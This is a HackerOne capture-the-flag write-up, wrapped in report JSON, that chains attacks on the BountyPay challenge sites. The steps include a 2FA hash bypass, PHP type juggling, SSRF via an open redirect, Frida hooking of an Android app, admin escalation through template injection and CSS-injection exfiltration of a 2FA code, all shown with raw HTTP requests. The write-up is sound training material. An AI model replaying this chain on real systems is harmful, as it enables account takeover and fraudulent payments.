{"id":894170,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQxNzA=","url":"https://hackerone.com/reports/894170","title":"[H1-2006 2020] Writeup","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2020-06-09T00:39:14.659Z","submitted_at":"2020-06-09T00:39:14.659Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"njbooher","url":"/njbooher","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/8gBaXxZaVswNz1ZdTYSp5vLP/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-18T00:09:28.262Z","bug_reporter_agreed_on_going_public_at":"2020-06-17T23:47:12.372Z","team_member_agreed_on_going_public_at":"2020-06-18T00:09:28.165Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"```\n^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\n```\n\n# Prologue\n\nThe CTF was announced in a [Hacker0x01 tweet](https://twitter.com/Hacker0x01/status/1266454022124376064). The goal is to make payments from Marten Mickos' account on BountyPayHQ. The announcement tweet was followed shortly by a [retweet of BountypayHQ](https://twitter.com/BountypayHQ/status/1258692145252270080), an account made for the event. [BountypayHQ](https://twitter.com/BountypayHQ) has one tweet about a new staff member Sandra, and has a follower with the same name. Sandra's account has a [tweet with a photo](https://twitter.com/SandraA76708114/status/1258693001964068864) of a staff badge with 'STF:8FJ3KFISL3' visible on it. We make note of this for later.\n\nOn the [policy page for the CTF](https://hackerone.com/h1-ctf) we find the link to [main site for the event](https://bountypay.h1ctf.com/). That site links to separate subdomains for customers ([app](https://app.bountypay.h1ctf.com/)) and staff ([staff](https://staff.bountypay.h1ctf.com/)). However, the policy page lists the scope as '\\*.bountypay.h1ctf.com', so there are probably more. Using [ffuf](https://github.com/ffuf/ffuf) to fuzz the Host header, we find\n[api](https://api.bountypay.h1ctf.com/) and [software](https://software.bountypay.h1ctf.com/). The software site says I can't access it from my IP address, and the api site [showcases an open redirect](https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API) on its homepage. This suggests we'll find an [SSRF vulnerability](https://portswigger.net/web-security/ssrf) at some point.\n\n# app.bountypay.h1ctf.com\n\n## Getting in\n\nInitially I guessed the user might be 'sandra' and tried common passwords with Burp. Then I went through all the punctuation marks to see if any gave an error indicative of some sort of injection. Eventually I used ffuf to check for common files and directories. This turned up [a .git/config file](https://app.bountypay.h1ctf.com/.git/config). Visiting the repository for that, we find [a script](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php) is logging the contents of incoming requests to [bp_web_trace.log](https://app.bountypay.h1ctf.com/bp_web_trace.log) on the server as base64-encoded JSON. After using [CyberChef](https://gchq.github.io/CyberChef/) to decode it, we get:\n\n```\n1588931909 {\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n1588931919 {\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n1588931928 {\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n1588931945 {\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n```\n\nPlugging that username and password into the login form, we are asked for a 2FA code. I enter the value from the log file and submit the request. It doesn't work. Looking at the request in Burp we see that a hash is submitted in the 'challenge' field along with the values we provided.\n\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge_answer=bD83Jk27dQ\u0026challenge=5ca3e50bd0b0c9b94915573b64b664be\n```\n\nIt looks like MD5. After using CyberChef to hash the username, password, and challenge\\_answer in succession, we use Burp repeater to replace the challenge value in the form and retry the requests. The hash of challenge\\_answer works. And returns a new cookie:\n\n```http\nHTTP/1.1 302 Found\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Sun, 05-Jul-2020 14:44:36 GMT; Max-Age=2592000\nLocation: /\n```\n\nI notice the cookie starts with `eyJ` which indicates base64-encoded JSON. I then use Burp repeater's 'Request in Browser' action to replay the action in the browser and log in.\n\n## A quick look around\n\nThe dashboard we land on after we log in has a table for listing payments. There is a form for selecting the month and year to show transactions for. No data is displayed for the current month.  Trying a few other months also returns nothing.\n\nGlancing over at the Burp proxy history, we see the form submissions to go [/statements?month=01\u0026year=2020](https://app.bountypay.h1ctf.com/statements?month=01\u0026year=2020). The JSON output this returns indicates it's a wrapper around a method on the API site:\n\n```json\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=01\u0026year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-01\\\",\\\"transactions\\\":[]}\"}\n```\n\nUsing Burp Intruder to add punctuation marks to month and year has no effect. Attempting to visit the API url directly gives an error about a missing token.\n\nWe also see that a file called [app.js](https://app.bountypay.h1ctf.com/js/app.js) was loaded. It contains the code that calls `/statements/`, as well as code to render the results. We see that results rows link to `/pay/{id}/{hash}`. Trying [a random number and MD5 hash](https://app.bountypay.h1ctf.com/pay/5/5ca3e50bd0b0c9b94915573b64b664be), we get an error 'Invalid payment details'. While we can't jump to making payments at this time, we know that wherever the CTF leads, we'll probably end up back here.\n\n## Analysis of the `token` cookie\n\nUsing CyberChef to decode the log in cookie we get:\n\n```json\n{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n\nThere's the account ID from the API site URL. We've probably found the SSRF.\n\nHowever, the first thing I like to do with JSON parameters is to change the data type of the parameters and see what happens. I use the [Hackvertor Burp plugin](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) and replace the token cookie value with:\n\n```\n\u003c@base64_2\u003e{\"account_id\":[\"F8gHiqSdpK\"],\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\u003c@/base64_2\u003e\n```\n\nThe account\\_id parameter, which is expected to be a string, is now an array. In response we get:\n\n```json\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/Array\\/statements?month=01\u0026year=2020\",\"data\":\"[\\\"Invalid Account ID\\\"]\"}\n```\n\nThis tells us two things:\n1. This site is probably built with PHP. (The string value of an array in PHP is 'Array')\n1. The value of account\\_id doesn't seem to matter to the app site. It just blindly forwards it to the API site.\n\nPHP is famous for its [type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf). In particular, how `\"any string\" == 0`. Let's try it.\n\n```\n\u003c@base64_2\u003e{\"account_id\":\"F8gHiqSdpK\",\"hash\":0}\u003c@/base64_2\u003e\n```\n\nWe get the same successful response from earlier.\n\nIn summary, account\\_id matters to the API site, and hash matters to the app site. If account\\_id were easily enumerable, we could stop here. But brute forcing it is worst case 62^10 = 8.3929937e+17 , so that's probably not going to happen. Back to the SSRF we go.\n\n## Exploit the SSRF\n\nIncorporating the information from the prologue, the goal is probably to use the open redirect on the API site to get something off the software site.\n\n```\n\u003c@base64_2\u003e{\"account_id\":\"../../redirect?url=https://www.google.com/search?q=REST+API#\",\"hash\":0}\u003c@/base64_2\u003e\n```\n\nTrying a URL other than Google, we find get an error \"URL NOT FOUND IN WHITELIST\". I wasted some time thinking this would need to be chained with an [I'm Feeling Lucky open redirect](https://nakedsecurity.sophos.com/2020/05/15/how-scammers-abuse-google-searchs-open-redirect-feature/). After a bit Google threw up a CAPTCHA. Then I realized I hadn't actually tried to just redirect to software directly.\n\n```\n\u003c@base64_2\u003e{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/#\",\"hash\":0}\u003c@/base64_2\u003e\n```\n\nWell, that worked, and now we see a login page. Adding [CRLF to try and add headers](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html) or insert additional requests didn't seem to work, so this is probably a GET-only SSRF and logging into the site won't be possible.\n\nAfter some content discovery with Intruder, we find a directory listing at /uploads/ containing one file: an Android app.\n\n```\n\u003c@base64_2\u003e{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/uploads/BountyPay.apk#\",\"hash\":0}\u003c@/base64_2\u003e\n```\n\nAttempting to download it through the SSRF gives an empty response. But downloading it directly works.\n\nhttps://software.bountypay.h1ctf.com/uploads/BountyPay.apk\n\n# BountyPay.apk\n\nI haven't done much with Android apps before, but I have done some basic static analysis. This [HackerOne blog post](https://www.hackerone.com/blog/androidhackingmonth-intro-to-android-hacking) is very helpful.\n\n## Static analysis\n\nI start by downloading [jadx](https://github.com/skylot/jadx) and use it to decompile the app.\n\nIt's divided into 3 main files:\n* F859859\n* F859858\n* F859857\n\nI don't see anything that looks like a token, and decide I will need to actually run the app.\n\n## Running the app\n\nI have an iPhone, so I download [Android Studio](https://developer.android.com/studio) for this.\n\nIn Android studio, I create a new empty application, and then open the 'Android Virtual Device Manager' and create a Pixel XL device with Android R. Afterwards, right click the device and do 'Cold Boot Now'. Then drag and drop the apk onto the virtual device to install it.\n\nThe first screen asks for a username, and when you click next you are dropped on an empty screen. There is a button in the corner that, when clicked, provides very helpful hints: 'Deep links' and 'Params'. I don't know what this means, and decide that dynamic analysis will be needed.\n\n## Dynamic analysis\nI installed [Frida](https://frida.re/docs/installation/) in my [WSL Ubuntu](https://docs.microsoft.com/en-us/windows/wsl/install-win10), which I frequently use for python stuff. Then, using the Terminal built into Android Studio, I rooted the emulator and installed the Frida server on the it following the directions [here](https://frida.re/docs/android/) .\n\n```\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe root\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe push C:\\Users\\Nick\\workspace\\hackeronectf\\frida-server-12.9.4-android-x86 /data/local/tmp/\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe shell \"chmod 755 /data/local/tmp/frida-server-12.9.4-android-x86\"\nC:\\Users\\Nick\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe shell \"/data/local/tmp/frida-server-12.9.4-android-x86 \u0026\"\n```\n\nGreat. Now that I have the tools installed, how does Android hacking work?\n\nThe [Frida Android example page](https://frida.re/docs/examples/android/) shows how to hook the onClick handler of a button. Looking back at the source for the three source files for BountyPay, they seem to all have a similar structure.\n\n```java\npublic void onCreate(Bundle savedInstanceState) {\n  // ... stuff\n  if (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n\n    // show boxes based on values of query parameters that are part of this 'intent' thing.\n    getIntent().getData().getQueryParameter(\"start\")\n\n  }\n}\n```\n\nSo it looks like all we have to do is hook onCreate and set the query parameters before calling the original onCreate.\n\n## Activities\n\n### PartOneActivity\n\nSource: F859859\n\nI throw this together in a script file:\n\n```javascript\nJava.perform(function () {\n\n  send('perform');\n  // Function to hook is defined here\n\n  var PartOneActivity = Java.use('bounty.pay.PartOneActivity');\n  var javaUri = Java.use('android.net.Uri');\n\n  // Whenever button is clicked\n  var onCreate = PartOneActivity.onCreate;\n  onCreate.implementation = function (savedInstanceState) {\n    // Show a message to know that the function got called\n    send('onCreate');\n\n    if (this.getIntent() != null) {\n        send('gotintent');\n        var intentData = javaUri.parse(\"content://asdf/?start=PartTwoActivity\");\n        this.getIntent().setData(intentData);\n    }\n\n    // Call the original onCreate handler\n    onCreate.call(this, savedInstanceState);\n  };\n});\n```\n\nand in my WSL Ubuntu terminal run it\n\n```bash\nfrida -U -l runme.js bounty.pay\n```\n\nAccording to the terminal output, only the 'perform' part happened. After some Googling, I find a [GitHub issue comment](https://github.com/frida/frida/issues/480#issuecomment-441453427) that explains that in order to hook onCreate we need our stuff to run before the app starts.\n\nI borrow the code from that comment and put my javascript in it.\n\nF859851\n\nI then kill the app on the emulator and run the python script with:\n\n```\npython3 ctf_part1.py\n```\n\nIt works, and we're on to part two.\n\n### PartTwoActivity\n\nSource: F859858\n\nReading the code, it's very similar to part one, and I update the Frida script accordingly.\n\nF859852\n\nAfter killing the app and running the script, there's a hash displayed on the screen (459a6f79ad9b13cbcb5f692d2cc7a94d), and a box prompting for a 'Header' value. From reading the code, we can see this must start with 'X-' to move on, so the hash that's displayed probably isn't what it's asking for. Peeking ahead at F859857 , we see a few base64-encoded strings. Decoding them, we find that `WC1Ub2tlbg==` is `X-Token`. I type 'X-Token' into the field and we're on to part 3.\n\n### PartThreeActivity\n\nSource: F859857\n\nReading the code, it's very similar to part one, except some of the query parameters are expected to be base64 encoded. I update the Frida script accordingly.\n\nF859854\n\nAfter killing the app and running the script, there's a box prompting for a leaked hash value. I try the hash from part two and it doesn't work.\n\nI notice in the source there are some calls to print a token to the logs, which would appear in the Logcat window in Android Studio. But those messages don't seem to have happened.\n\nWhile wondering what to do next, I notice that after a delay, these messages start appearing in the logs:\n\n```\nbounty.pay I/TAG: Starting authentication\nbounty.pay D/TAG: signInAnonymously:success\nbounty.pay I/TAG: Getting host endpoint\nbounty.pay I/TAG: Getting Token\n```\n\nMaybe now that it's had time to fetch them, they'll be printed if we retry it?\n\nI click the back button in the emulator, and resubmit the form for PartTwoActivity. Now in the logs we see:\n\n```\nbounty.pay D/HOST IS:: http://api.bountypay.h1ctf.com\nbounty.pay D/TOKEN IS:: 8e9998ee3137ca9ade8f372739f062c1\n```\n\nEntering that token into the PartThreeActivity, a congratulations screen appears. We've now got a token for the API server!\n\n# api.bountypay.h1ctf.com\n\nNow that I have an API token, I use Intruder to try other HTTP methods on the one endpoint we know about:\n\n```http\nPOST /api/accounts/F8gHiqSdpK/statements?month=04\u0026year=2020 HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n\nNothing happens. I then try adding punctuation to each part of the path, query parameters, and token header value. Nothing interesting happens.\n\nNext I use ffuf to look for other methods and find the `/api/staff` method. It responds with:\n\n```json\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n```\n\nI then use Intruder to try other HTTP methods on this endpoint. POST returns the following message:\n\n```json\n[\"Missing Parameter\"]\n```\n\nI add name as a body parameter. Same message.\n\nThen I try staff_id with a value from the GET response.\n\n```http\nPOST /api/staff/ HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 23\n\nstaff_id=STF:84DJKEIP38\n```\n\nThe following message is returned:\n\n```json\n[\"Staff Member already has an account\"]\n```\n\nAh, so this is making a new staff member account. Sandra from Twitter doesn't seem to be in the list. Let's try her ID (STF:8FJ3KFISL3)\n\nResponse:\n\n```json\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\n# staff.bountypay.h1ctf.com\n\n## Getting in\nVisiting the site, we are redirected to [/?template=login](https://staff.bountypay.h1ctf.com/?template=ticket).\nIn the last section we saw that Brian Oliver is supposedly a staff member. I try logging in with the credentials we used for him on the app site and they don't work. I then use the credentials the API server gave us for Sandra and they work. The cookie looks like:\n\n```\ntoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n```\n\n## A quick look around\n\nThe main page is [/?template=home](https://staff.bountypay.h1ctf.com/?template=home)\n\nThe functionality of the site is minimal. The dashboard has two tabs:\n\n1. A list of support tickets, with only one ticket. Viewing a ticket has its on template: [/?template=ticket\u0026ticket_id=3582](https://staff.bountypay.h1ctf.com/?template=ticket\u0026ticket_id=3582)\n1. A form to change your profile name and avatar. This posts to [/?template=home](https://staff.bountypay.h1ctf.com/?template=home).\n\nIn Burp proxy history, we see that a file [website.js](https://staff.bountypay.h1ctf.com/js/website.js) was loaded. It contains functions calling two additional pages:\n\n1. [/admin/upgrade?username=sandra.allison](https://staff.bountypay.h1ctf.com/admin/upgrade?username=sandra.allison) to upgrade a user to admin. It can be called with a GET request, but trying it gives an error: \"Only admins can perform this\"\n1. [/admin/report?url=Lz90ZW1wbGF0ZT1ob21l](https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZT1ob21l) to report a page for the admin to review. The URL parameter is base64 encoded. In response it returns \"Report received\". Reporting the /admin/upgrade URL returns the same response and nothing happens.\n\n## Dead ends\n\nI begin by testing all of the parameters observed for signs of injection vulnerabilities using my trusty wordlist of punctuation marks. Nothing stands out.\n\nI test all the parameters for what happens if you turn them into an array. Nothing stands out.\n\nI call /admin/report with the url parameter pointing at a Burp collaborator URL as well as my SSRF testing toy app. No requests are received.\n\nI test the template parameter for path traversal and local file inclusion. Doesn't seem to work.\n\n## Another dead end\n\nWhile token cookie format doesn't look like base64-encoded JSON, I try decoding it as base64 anyway.\n\n```\nsIluEVmypbzy/Un0njpgLfyONobB8ao8pxKJhQBdhRTpg1SCXylVDJrRjrr0JeMlTdnr/Ss32wXInW6cEKYyOQCu5MdRO1/SMkCXAd80mDdemzDFVyYYTuVzx04Vy1ilQmOBQP6tUh97pAYcoCim+vwDdaQu7PGRaRn6d4zG\n```\n\nOdd, that still looks like base64. Decoding it again returns a blob of unprintable stuff.\n\nWhile testing the profile name change functionality I noticed the cookie value got longer when I used longer profile names. This suggests the cookie is actually storing the state for this and there's no backing database. While this site is supposed to act like a real site, it makes sense that it would be implemented this way. It seems unlikely that breaking the cookie is the intended solution here. I still put a few hours into it and was unsuccessful.\n\n## Half an XSS\n\nTaking a closer look at [website.js](https://staff.bountypay.h1ctf.com/js/website.js), we see the makings of what could be an XSS.\n\nIf the URL hash matches 'tab[1-4]' the code will trigger the onClick event on elements with that class on page load. The onClick event for  'upgradeToAdmin' will trigger the request to upgrade the username specified in the 'username' input field. The inclusion of tab4 in the hash code seems odd since the dashboard markup only has tab1, tab2, and tab3. Maybe the username field is on tab4 for admins.\n\nLooking around for an opportunity to inject a class name in the markup, we see that the user avatar setting is used as a CSS class name. Intercepting the POST request to change the profile name, we modify it to change the avatar value:\n\n```http\nPOST /?template=home HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n\nprofile_name=sandra\u0026profile_avatar=upgradeToAdmin%20tab1%20tab2%20tab3%20tab4\n```\n\nThis updates our cookie. Next we visit [/?template=home#tab1](https://staff.bountypay.h1ctf.com/?template=home#tab1) and can see in the Burp Proxy history that a request to /admin/upgrade was made on page load.\n\nTime to test this out for real. I make a request to\n\n```http\nGET /admin/report?url=\u003c@base64_2\u003e/?template=home\u0026username=sandra.allison#tab4\u003c@/base64_2\u003e HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMMXZvZUVPWWVKdGYvRWRGcXozbVVUWXFldWtmdmlVQzQxQ0FTR2V5U0w3WEMxWnltMlpjNzBISitQZ1RhZVJsNDY3TlBGbnBQY3VaTkwvSEEwTURoc3lsZy8xMVpPTHg5UDVoR21ZeUk1TlM5VlJhSCs0VGZkNFl2Ullj\n```\n\nannnnnnd...\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 19\n\n[\"Report received\"]\n```\n\nThat was disappointing.\n\n## The missing piece\n\nI messed with this a bit on Monday and didn't get anywhere. I was stuck and out of ideas. I tried to forget about it because I figured the answer would probably come to me later.\n\nTuesday morning while retrying everything, I realize I overlooked something. While I had tried changing parameters to arrays already, I must have skipped this check for the template parameter in favor of looking for path traversal. Doing so now, I noticed that changing template parameter to an array still loaded the page successfully, even though changing it to garbage strings gave a blank page.\n\nThen I realized that passing multiple values in the array would render [multiple templates on the same page](https://staff.bountypay.h1ctf.com/?template[]=login\u0026template[]=ticket).\n\nAfter a bit I figure out the correct URL to report.\n\n```http\nGET /admin/report?url=\u003c@base64_2\u003e/?template[]=login\u0026username=sandra.allison\u0026template[]=ticket\u0026ticket_id=3582#tab3\u003c@/base64_2\u003e HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMMXZvZUVPWWVKdGYvRWRGcXozbVVUWXFldWtmdmlVQzQxQ0FTR2V5U0w3WEMxWnltMlpjNzBISitQZ1RhZVJsNDY3TlBGbnBQY3VaTkwvSEEwTURoc3lsZy8xMVpPTHg5UDVoR21ZeUk1TlM5VlJhSCs0VGZkNFl2Ullj\n```\n\nannnnnnd...\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMMXZvZUVPWWVKdGYvRWRGcXozbVVUWXFldWtmdmlVQzQxQ0FTR2V5U0w3WEMxWXZvVjl5K1gzQTlmZ1RhZVJsNDY3TlBGbnBQY3VaTkwrUkJrVlZoYy96aEtjZ043YWhwdmx2SEdwaWNKVUMrRlJkU2VCRUtkZ2I2aFlj; expires=Sun, 05-Jul-2020 18:58:11 GMT; Max-Age=2592000; path=/\nContent-Length: 19\n\n[\"Report received\"]\n```\n\nWe're in. Re-visiting the homepage, a full list of users and plain-text passwords is now on tab 4.\n\n```\nmarten.mickos\nh\u0026H5wy2Lggj*kKn4OD\u0026Ype\n```\n\n# Back at app.bountypay.h1ctf.com\n\n## Getting in\n\nBack on the customer site, we login with the new credentials and bypass the 2FA the same way as before, re-using the same challenge and challenge answer.\n\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 130\n\nusername=marten.mickos\u0026password=h%26H5wy2Lggj*kKn4OD%26Ype\u0026\u0026challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026challenge_answer=bD83Jk27dQ\n```\n\n## The new `token` cookie\n\nOur new token is\n\n```\ntoken=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n```\n\nDecoded we get.\n\n```\n\u003c@base64_4\u003e{\"account_id\":\"Ae8iJLkn9z\",\"hash\":\"3616d6b2c15e50c0248b2276b484ddb2\"}\u003c@/base64_4\u003e\n```\n\nAnd test that replacing the hash with 0 still works.\n\n```\n\u003c@base64_4\u003e{\"account_id\":\"Ae8iJLkn9z\",\"hash\":0}\u003c@/base64_4\u003e\n```\n\nStill works. I should have stuck with brute forcing the account id. Ae8iJLkn9z was going to be my next guess.\n\n## The End\n\nOn the dashboard, we select 05/2020 and click 'Load Transactions'.\n\nA table row appears indicating we owe Hacker 272 over $200,000!\n\nThis is it! We can pay the hackers now!\n\nWe click the green [Pay](https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba) button. And we find the flag!\n\n{F859856}\n\n# Epilogue\n\nActually, we hit another 2FA screen.\n\nI click the 'Send Challenge' button. Glancing over at the Burp history we see that the request includes a hidden parameter.\n\n```http\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 73\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n```\n\nOk, we'll need to use [CSS injection](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d).\n\nI turn one of my wordlists into a stylesheet using regex find and replace in VSCode.\n\nF859855\n\nI upload it into a private GitHub gist, and swap it in for the app_style param in the request. And it doesn't work. After a bit I figure out it's because Gist doesn't serve files with the expected Content-Type header. I use [GitHack](https://raw.githack.com/) to wrap it, and it works.\n\nBurp collaborator receives 7 pings for code_[1-7]. I generate another stylesheet to actually extract the values.\n\nF859853\n\nI create another private Gist to host it and get a GitHack URL for it.\n\nBurp collaborator receives 7 pings, one for each character of the code. I enter it. And the flag appears.\n\n```\n^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\n```\n\n## Impact\n\nThis was fun. Thanks.","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":859851,"file_name":"ctf_part1.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QuZWtinRL3nHdvWBjE9yYYrL?response-content-disposition=attachment%3B%20filename%3D%22ctf_part1.py%22%3B%20filename%2A%3DUTF-8%27%27ctf_part1.py\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153914Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8